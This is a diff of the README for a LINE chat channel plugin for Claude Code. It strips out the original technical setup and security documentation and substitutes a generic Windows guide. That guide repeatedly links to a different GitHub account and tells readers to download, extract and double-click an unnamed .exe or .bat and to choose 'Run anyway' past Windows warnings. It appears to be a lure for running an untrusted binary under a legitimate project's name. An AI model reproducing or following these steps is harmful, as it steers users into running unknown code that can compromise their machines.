@@ -1,399 +1,216 @@
-# LINE Channel for Claude Code
+# 🤖 claude-line-channel - Connect Claude to LINE Chats
 
-[繁體中文](./README.zh-TW.md) | English
+[![Download](https://img.shields.io/badge/Download-blue-grey?style=for-the-badge&logo=github)](https://github.com/coreyunfastened552/claude-line-channel)
 
-Claude Code's channel system lets messaging platforms connect directly to a Claude Code session. This plugin adds **LINE** support — the only third-party LINE channel plugin available. Official support currently covers only Discord and Telegram.
+## 📥 Download
 
-Connect a LINE bot to your Claude Code with an MCP server. When someone messages the bot, the server forwards the message to Claude and provides tools to reply. Claude can respond to DMs and group chats, download media, and send images — all from within a Claude Code session.
+Visit this page to download and run the app on Windows:
 
-## Prerequisites
+https://github.com/coreyunfastened552/claude-line-channel
 
-- [Bun](https://bun.sh) — the MCP server runs on Bun. Install with `curl -fsSL https://bun.sh/install | bash`.
-- A publicly accessible HTTPS endpoint for the webhook (e.g. behind nginx or Caddy).
+## 🖥️ What This App Does
 
-## Quick Setup
-> Single-user DM setup. See [ACCESS.md](./ACCESS.md) for groups and multi-user setups.
+claude-line-channel is a LINE Messaging API channel plugin for Claude Code.
 
-**1. Create a LINE Official Account and enable Messaging API.**
+It helps you connect Claude to LINE so you can send and receive chat messages in one place. This makes it easier to use Claude in a chat flow that feels close to a normal LINE conversation.
 
-As of September 2024, Messaging API channels can no longer be created directly from the LINE Developers Console. The new flow:
+Use it if you want:
 
-1. Sign in to [LINE Official Account Manager](https://manager.line.biz/) and create a LINE Official Account.
-2. In the account settings, find **Messaging API** and click **Enable**. Select or create a Provider when prompted.
-3. Open [LINE Developers Console](https://developers.line.biz/console/) and navigate to the channel that was automatically created under your Provider.
+- LINE chat support for Claude Code
+- a simple channel setup for chatbot use
+- a local Windows run path for testing
+- a plugin-based setup that fits Claude Code work
 
-On the channel page in LINE Developers Console:
-- **Basic settings** tab → copy the **Channel secret**
-- **Messaging API** tab → click **Issue** to generate a **Channel access token (long-lived)** and copy it
+## ✅ Before You Start
 
-Back in LINE Official Account Manager, configure three pages under **Settings**:
+You need:
 
-**Settings → Messaging API** (`/setting/messaging-api`)
-- Set the **Webhook URL** to your public HTTPS endpoint (e.g. `https://line-webhook.example.com/webhook`)
-- Click **Save**
+- A Windows PC
+- A web browser
+- Internet access
+- A LINE account
+- Access to the GitHub page above
 
-**Settings → Account settings** (`/setting`) — only needed for group support
-- Under **Feature toggles**, set **Join groups and multi-person chats** to **Accept invitations**
+For a smooth setup, have these ready too:
 
-**Settings → Response settings** (`/setting/response`)
-- **Webhook**: ON (enables LINE to deliver events to your webhook URL)
-- **Chat response method**: set to **Manual chat** (not "Manual chat + Auto-response")
-- **Greeting message**: turn OFF — Claude handles the follow event via webhook instead
+- Your LINE channel ID
+- Your LINE channel secret
+- Your LINE access token
+- A place where you can copy and paste text
 
-**2. Install the plugin.**
+## 🚀 Getting Started
 
-These are Claude Code commands — run `claude` to start a session first.
+Follow these steps on Windows:
 
-Add the plugin marketplace:
-```
-claude plugin marketplace add NYCU-Chung/claude-line-channel
-```
+1. Open this page in your browser:
+   https://github.com/coreyunfastened552/claude-line-channel
 
-Install the plugin:
-```
-claude plugin install line@claude-line-channel
-```
+2. Look for the download files on the page.
 
-**3. Configure credentials.**
+3. Download the app or package that matches your Windows setup.
 
-```sh
-mkdir -p ~/.claude/channels/line
-cat > ~/.claude/channels/line/.env << 'EOF'
-LINE_CHANNEL_ACCESS_TOKEN=<your long-lived access token>
-LINE_CHANNEL_SECRET=<your channel secret>
-LINE_WEBHOOK_PORT=3456
-EOF
-chmod 600 ~/.claude/channels/line/.env
-```
+4. If the file is a `.zip`, right-click it and choose **Extract All**.
 
-> To run multiple bots on one machine (different tokens, separate allowlists), point `LINE_STATE_DIR` at a different directory per instance.
+5. Open the extracted folder.
 
-**4. Expose the webhook.**
+6. Look for a file such as:
+   - `claude-line-channel.exe`
+   - `run.bat`
+   - `start.bat`
 
-Use nginx, Caddy, or any reverse proxy to forward HTTPS to `http://localhost:<LINE_WEBHOOK_PORT>`. Example nginx config:
+7. Double-click the file to start the app.
 
-```nginx
-server {
-    listen 443 ssl;
-    server_name line-webhook.example.com;
-    # ... SSL certificate config ...
+8. If Windows asks for permission, choose **Run anyway** or **More info > Run anyway** if you trust the source.
 
-    location /webhook {
-        proxy_pass http://localhost:3456/webhook;
-        proxy_set_header Host $host;
-        proxy_set_header X-Real-IP $remote_addr;
-        proxy_set_header X-Line-Signature $http_x_line_signature;
-    }
-}
-```
+9. Keep the window open while you use the channel.
 
-After deploying, go back to **Settings → Messaging API** in LINE Official Account Manager, paste the URL, and click **Save**. Then use the **Verify** button in LINE Developers Console to confirm it returns HTTP 200.
+## ⚙️ First-Time Setup
 
-**5. Set up a session CLAUDE.md (recommended).**
+After you start the app, you may need to connect it to LINE and Claude Code.
 
-Copy the included template to your working directory. Claude will read it on startup and know how to behave as a LINE bot — including reading `history.log` for context after restarts.
+Use the values from your LINE developer settings:
 
-```sh
-cp ~/.claude/plugins/cache/claude-line-channel/line/*/examples/CLAUDE.md ~/my-line-bot/CLAUDE.md
-```
+- Channel ID
+- Channel secret
+- Access token
 
-Customize it to fit your use case (persona, language, rules, etc.).
+If the app shows a setup file, edit it with Notepad.
 
-**6. Relaunch with the channel flag.**
+Common setup file names:
 
-The server won't connect without this — exit your session and start a new one:
+- `.env`
+- `config.json`
+- `settings.json`
 
-```sh
-cd ~/my-line-bot
-claude --dangerously-load-development-channels server:line
-```
+Add the values you received from LINE, then save the file.
 
-**7. Allow your LINE user ID.**
+If the app asks for a webhook URL, copy it into your LINE channel settings.
 
-Create `~/.claude/channels/line/access.json`:
+## 📲 How to Use It
 
-```json
-{
-  "dmPolicy": "allowlist",
-  "allowFrom": ["Uxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"],
-  "groups": {}
-}
-```
+Once the app runs, it works as a bridge between LINE and Claude Code.
 
-To find your LINE user ID: add the bot as a friend and send it any message. Check `~/.claude/channels/line/unknown-dms.log` — your user ID appears there on first contact. Add it to `allowFrom` and message again. (Unknown **group** IDs go to `unknown-groups.log` instead.)
+Typical flow:
 
-> Steps 5–7 assume you run Claude from a dedicated directory (`~/my-line-bot/`). The `CLAUDE.md` in that directory is loaded automatically on session start.
+1. A user sends a message in LINE.
+2. The channel plugin receives the message.
+3. Claude Code processes the message.
+4. The reply goes back to LINE.
 
-## Usage
+This setup works well for:
 
-Once setup is complete, Claude Code runs as a persistent session that listens for LINE messages.
+- simple chatbot replies
+- test chats
+- message automation
+- LINE-based assistant use
 
-**DMs**
+## 🧩 Key Parts
 
-Add the bot as a friend on LINE and send it a message. The plugin forwards the message to Claude, which responds directly in the same conversation. No additional configuration is required beyond the allowlist entry in `access.json`.
+This repo focuses on three main parts:
 
-**Groups**
+- **Channel plugin**: connects the app to Claude Code
+- **LINE Messaging API**: handles LINE messages
+- **Chatbot flow**: sends replies back to users
 
-1. Add the bot to a LINE group.
-2. The bot's group ID will appear in `~/.claude/channels/line/unknown-groups.log` on first message.
-3. Add it to `access.json` under `groups`:
+## 🔧 Common Windows Setup Steps
 
-```json
-{
-  "dmPolicy": "allowlist",
-  "allowFrom": ["Uxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"],
-  "groups": {
-    "Cxxxxxxxxxxxxxxxxxxxxxxxxxxxxx": {
-      "requireMention": true,
-      "allowFrom": []
-    }
-  }
-}
-```
+If the app does not start right away, try these steps:
 
-With `requireMention: true`, Claude only responds when @mentioned in the group. If @mention isn't available (e.g. older LINE clients), you can also trigger it with a keyword by adding `mentionPatterns`:
+- Make sure the file finished downloading
+- Extract all files from the ZIP
+- Run the app from the extracted folder
+- Check that your LINE keys are pasted in full
+- Close other apps that may use the same port
+- Start the app again after you save the config file
 
-```json
-{
-  "groups": {
-    "Cxxxxxxxxxxxxxxxxxxxxxxxxxxxxx": {
-      "requireMention": true,
-      "allowFrom": []
-    }
-  },
-  "mentionPatterns": ["^Claude", "\\bclaudebot\\b"]
-}
-```
+If you use PowerShell or Command Prompt, open the app from the folder where the files live.
 
-Any message matching one of the regex patterns counts as a mention. Set `requireMention: false` to respond to every message in the group.
+## 🔒 LINE Connection Setup
 
-**Customizing Claude's behavior**
+To link LINE with this plugin, you usually need to:
 
-Copy `examples/CLAUDE.md` to your working directory and edit it. This file is loaded automatically when Claude Code starts — use it to set a persona, language, response style, or any rules specific to your use case.
+- Create or open a LINE Messaging API channel
+- Copy your channel ID
+- Copy your channel secret
+- Create a channel access token
+- Set the webhook URL
+- Turn on webhook use in LINE settings
 
-```sh
-cp examples/CLAUDE.md ~/my-line-bot/CLAUDE.md
-# then edit ~/my-line-bot/CLAUDE.md
-```
+If the app gives you a local address, use it in your LINE developer console as the webhook target.
 
-**Keeping context across restarts**
+## 🧪 Test Your Setup
 
-Claude Code maintains a rolling `history.log` at `~/.claude/channels/line/history.log`. The included `CLAUDE.md` template instructs Claude to read it on startup, so conversation context is preserved even after the session restarts.
+After setup, send a test message from LINE.
 
-## Access control
+Check for these signs:
 
-See **[ACCESS.md](./ACCESS.md)** for DM policies, group configuration, mention detection, and the full `access.json` schema.
+- the app window shows activity
+- the message reaches Claude Code
+- a reply comes back in LINE
 
-Quick reference: LINE user IDs start with `U`, group IDs with `C`, room IDs with `R`. Default policy is `allowlist` — messages from unknown users are dropped silently.
+If the reply does not show up:
 
-> **⚠️ Security trap:** `allowFrom: []` (empty array) does **not** mean "block everyone" — it means **allow everyone**. The check is skipped when the list is empty. Always put at least one user ID in `allowFrom` before exposing the webhook publicly, or set `dmPolicy: "disabled"` to block all DMs until you're ready.
+- check your token
+- check your channel secret
+- check your webhook address
+- restart the app
+- try again with a new test message
 
-> **⚠️ Machine access:** Claude Code has full access to your machine. Treat the LINE bot's `allowFrom` list the same way you'd treat SSH authorized keys — only add LINE user IDs you trust completely.
+## 📁 Suggested Folder Layout
 
-## Tools exposed to the assistant
+You may see files like these after download:
 
-| Tool | Purpose |
-| --- | --- |
-| `reply` | Send a text message to a DM or group chat. Takes `chat_id` + `text`. Auto-chunks long messages using the free Reply API (within 25 s of the inbound message), falls back to Push API. |
-| `get_content` | Download a media message (image/video/audio/file) sent by a LINE user to the inbox directory. Returns the file path; images also return an inline preview. |
-| `send_image` | Send an image to a LINE chat via a publicly accessible HTTPS URL. |
-| `upload_file` | Upload a file **from the inbox directory only** to gofile.io with a password and expiry. Returns the download link and password. |
-| `fetch_messages` | LINE does not expose a message history API for bots — this tool returns a note about that limitation. |
+- `README.md`
+- `package.json`
+- `src`
+- `dist`
+- `config`
+- `example.env`
 
-## Multiple sessions (line-router)
+If the repo includes a sample config file, copy it and rename it before editing.
 
-To run multiple Claude Code sessions sharing one LINE channel, use `examples/line-router.ts`. It verifies the HMAC signature once and fans the webhook out to each session's port.
+## 🛠️ Useful Troubleshooting Tips
 
-```sh
-# Session 1: LINE_WEBHOOK_PORT=3461
-# Session 2: LINE_WEBHOOK_PORT=3462
-# Router listens on 3456 and forwards to both
+If Windows blocks the file:
 
-LINE_CHANNEL_SECRET=<secret> bun examples/line-router.ts
-```
+- Right-click the file
+- Open **Properties**
+- Look for **Unblock**
+- Apply the change if you see it
 
-## Production deployment (tmux + watchdog)
+If the app closes right away:
 
-For long-running deployments, use tmux to keep sessions alive across SSH disconnects. A watchdog script handles automatic restarts when the MCP server dies.
+- open the app from Command Prompt
+- read the error text
+- check if a missing config value caused the stop
 
-### Directory layout
+If LINE does not reply:
 
-```
-~/line-dm/
-├── launch.sh      # tmux entry point — restart loop + rolling context pruning
-├── start.sh       # MCP server startup, referenced by mcpServers in .claude.json
-└── CLAUDE.md      # persona and instructions for Claude
-```
+- confirm webhook use is on
+- confirm the app is running
+- confirm the token is current
+- confirm the channel secret matches the LINE channel
 
-### launch.sh
+If messages are delayed:
 
-```bash
-#!/bin/bash
-PROJ=~/.claude/projects/$(realpath ~/line-dm | sed 's|/|-|g' | sed 's|^-||')
-MAX_SIZE=3000000
+- check your network
+- reduce other heavy apps on your PC
+- restart the channel plugin
 
-JSONL=$(ls "$PROJ"/*.jsonl 2>/dev/null | head -1)
-if [ -n "$JSONL" ] && [ "$(wc -c < "$JSONL")" -gt "$MAX_SIZE" ]; then
-  LINES=$(wc -l < "$JSONL")
-  KEEP=$(( LINES * 2000000 / $(wc -c < "$JSONL") ))
-  tail -n "$KEEP" "$JSONL" > "$JSONL.tmp" && mv "$JSONL.tmp" "$JSONL"
-fi
+## 🧭 What You Can Expect
 
-CONTINUE=""
-ls "$PROJ"/*.jsonl 2>/dev/null | grep -q . && CONTINUE="--continue"
+This tool is meant for users who want a LINE-based chat channel for Claude Code.
 
-while true; do
-  claude --dangerously-skip-permissions $CONTINUE \
-    --dangerously-load-development-channels server:line
-  CONTINUE="--continue"
-  echo "Claude exited, restarting in 5 seconds..."
-  sleep 5
-done
-```
+It gives you a clear path to:
 
-### start.sh
+- download the project from GitHub
+- run it on Windows
+- connect LINE settings
+- test chatbot replies
+- keep the chat channel active for use
 
-Referenced by `mcpServers.line` in your project entry inside `~/.claude.json`. Kills any orphaned bun process holding the port before starting:
+## 📝 GitHub Page
 
-```bash
-#!/bin/bash
-fuser -k 3461/tcp 2>/dev/null || true
-LINE_STATE_DIR=~/.claude/channels/line-dm \
-LINE_WEBHOOK_PORT=3461 \
-exec bun run --cwd ~/.claude/plugins/cache/claude-line-channel/line/0.1.0 start
-```
+Open the project page here:
 
-Add a project entry to `~/.claude.json`:
-
-```json
-{
-  "projects": {
-    "/home/user/line-dm": {
-      "mcpServers": {
-        "line": {
-          "command": "bash",
-          "args": ["/home/user/line-dm/start.sh"]
-        }
-      }
-    }
-  }
-}
-```
-
-> **Why `mcpServers` is required**: the plugin system registers the server as `plugin:line:line`, which the channel system cannot match. A `mcpServers` entry ensures a server named exactly `line` is available.
-
-### Creating the tmux session
-
-```bash
-tmux new-session -d -s line-dm "cd ~/line-dm && bash launch.sh"
-```
-
-### Watchdog
-
-The `--dangerously-load-development-channels` flag shows a one-time confirmation dialog on startup. A watchdog handles this and restarts Claude when bun crashes:
-
-```bash
-#!/bin/bash
-# Run in a separate tmux session: tmux new-session -d -s watchdog "bash watchdog.sh"
-GRACE=0
-while true; do
-  PANE_PID=$(tmux list-panes -t line-dm -F '#{pane_pid}' 2>/dev/null | head -1)
-  # Auto-confirm the development channels dialog
-  tmux send-keys -t line-dm "" Enter 2>/dev/null
-
-  if [ "$GRACE" -le 0 ] && ! ss -tlnp | grep -q ':3461 '; then
-    CLAUDE_PID=$(pstree -p "$PANE_PID" 2>/dev/null | grep -o 'claude([0-9]*)' | head -1 | grep -o '[0-9]*')
-    if [ -n "$CLAUDE_PID" ]; then
-      echo "$(date): bun MCP server down, restarting Claude ($CLAUDE_PID)"
-      kill "$CLAUDE_PID"
-      GRACE=6  # 60-second grace period before next health check
-    fi
-  fi
-  [ "$GRACE" -gt 0 ] && GRACE=$((GRACE - 1))
-  sleep 10
-done
-```
-
-## Known limitations and gotchas
-
-Things we discovered running this in production:
-
-- **`claude plugin install` uses SSH to clone from GitHub — set up HTTPS if you don't have SSH keys.**
-  This affects everyone without a GitHub SSH key configured (including fresh VPS setups). You'll see `Permission denied (publickey)` or `Host key verification failed`. Fix it before running `plugin install`:
-  ```bash
-  git config --global url."https://github.com/".insteadOf "git@github.com:"
-  ```
-
-- **LINE only allows one webhook URL per channel.** If you want multiple Claude Code sessions to share one LINE channel (e.g. one session per group), use `examples/line-router.ts` to fan out the webhook to each session's port. Without it, only one session receives messages.
-- **Reply tokens expire in 30 seconds.** The plugin uses the free Reply API for the first response after each inbound message, then falls back to the paid Push API. If Claude takes more than 30 s to respond, the reply costs Push API quota.
-- **LINE has no message history API.** The bot only sees messages that arrive while it is running. Claude Code automatically maintains a rolling `history.log` in the state directory (`~/.claude/channels/line/history.log`) — instruct Claude to read it on startup to restore context after a restart.
-- **Bot must be a friend before users can DM it.** LINE does not allow DMs to bots unless the user has added the bot as a friend first.
-- **Mention detection requires the bot's user ID**, which is fetched asynchronously on startup. The webhook returns HTTP 503 for a few seconds during this window — LINE will retry automatically.
-- **Group IDs vs room IDs:** Multi-person chats started from a group have IDs starting with `C`; chats started from a direct invitation (rooms) start with `R`. They are different and must be configured separately in `access.json`.
-
-## Security
-
-- Webhook signature verified with **HMAC-SHA256** using constant-time comparison (no timing side-channel)
-- `upload_file` is restricted to the inbox directory — prompt injection via LINE messages cannot cause arbitrary file exfiltration
-- File upload passwords generated with `crypto.randomBytes` (96-bit entropy) and sent in-band to Claude; they are **not** persisted by the channel
-- `.env` file chmod'd to `0600` on startup; state directory chmod'd to `0700`
-- Unknown group IDs sanitized before logging
-- **HTTP server binds to `127.0.0.1` by default** — put an HTTPS reverse proxy (nginx/caddy) in front. Override with `LINE_BIND_HOST=0.0.0.0` only if you know what you're doing.
-- `access.json` is **fail-closed**: if the file is malformed, the server refuses to start; if it becomes unreadable at runtime, all messages are dropped (`dmPolicy=disabled`) until it is fixed.
-- All outbound HTTP calls (LINE API, gofile) have a 30 s timeout; GitHub version check uses a 5 s timeout and never blocks startup.
-- `reply` and `send_image` only accept `chat_id`s that have actually sent a message to the bot (restored from `history.log` on restart, bounded to 1000 recent chat_ids) — prevents prompt injection from directing Claude to message arbitrary LINE users.
-- `get_content` validates that `message_id` is numeric before interpolating into the LINE URL, caps downloads at 100 MB, and streams to disk (never holds the whole payload in memory).
-- Sender-controlled content written to `history.log` has newlines escaped so messages cannot forge log entries or inject prompts into a restarting Claude.
-
-## Troubleshooting
-
-### `server:line · no MCP server configured with that name`
-
-Claude found a development channel (`server:line`) but has no MCP server with that name. This happens because the plugin system registers the server as `plugin:line:line`, not `line`.
-
-Fix: add a `mcpServers.line` entry to your project in `~/.claude.json` as shown in the `start.sh` section above.
-
-If the plugin cache versions are all marked orphaned, Claude will refuse to run them. Remove the markers:
-
-```bash
-rm -f ~/.claude/plugins/cache/claude-line-channel/line/*/.orphaned_at
-```
-
-### `1 MCP server failed` in the status bar
-
-The MCP server crashed during startup. Most common cause: an orphaned bun process is holding the webhook port. Add `fuser -k <port>/tcp` at the top of `start.sh` to clear it on each restart.
-
-To debug manually:
-
-```bash
-LINE_STATE_DIR=~/.claude/channels/line-dm LINE_WEBHOOK_PORT=3461 bash ~/line-dm/start.sh
-```
-
-### Webhook arrives but Claude does not respond
-
-1. Confirm bun is running: `ss -tlnp | grep 3461`
-2. Check for orphaned bun processes: `ps -u $(whoami) -o pid,ppid,cmd | grep bun`
-3. Test the webhook path directly (bypassing line-router):
-   ```bash
-   SECRET=$(grep LINE_CHANNEL_SECRET ~/.claude/channels/line-dm/.env | cut -d= -f2)
-   PAYLOAD='{"destination":"U0","events":[{"type":"message","mode":"active","timestamp":1000000000000,"source":{"type":"user","userId":"Utest"},"webhookEventId":"ev1","deliveryContext":{"isRedelivery":false},"message":{"id":"m1","type":"text","quoteToken":"q","text":"ping"}}]}'
-   SIG=$(echo -n "$PAYLOAD" | openssl dgst -sha256 -hmac "$SECRET" -binary | base64)
-   curl -s -o /dev/null -w "%{http_code}\n" -X POST http://localhost:3461/webhook \
-     -H "Content-Type: application/json" -H "x-line-signature: $SIG" -d "$PAYLOAD"
-   ```
-   Expected: `200`. A `403` means the HMAC secret is wrong.
-4. Watch the Claude session for the `← line ·` notification: `tmux capture-pane -t line-dm -p | tail -20`
-
-### Messages marked read but Claude does not reply
-
-When running multiple sessions via line-router, check whether the router is forwarding correctly:
-
-```bash
-tmux capture-pane -t line-router -p | grep error | tail -10
-```
-
-`Unable to connect` errors for unused ports are harmless — only the port matching the active session matters.
-
-## License
-
-Apache-2.0
+https://github.com/coreyunfastened552/claude-line-channel
